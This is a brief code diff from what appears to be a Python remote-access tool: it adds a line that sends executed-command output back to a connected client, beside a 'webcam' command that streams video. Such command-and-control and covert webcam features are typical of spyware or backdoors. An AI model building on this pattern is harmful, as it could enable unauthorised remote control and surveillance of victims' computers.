@@ -83,6 +83,7 @@ def main():
 				output = str(e)
 			else:
 				output = ""
+			client.send(output.strip())
 		elif cmd == "webcam":
 			stream = VideoStream(s)
 			stream.send()
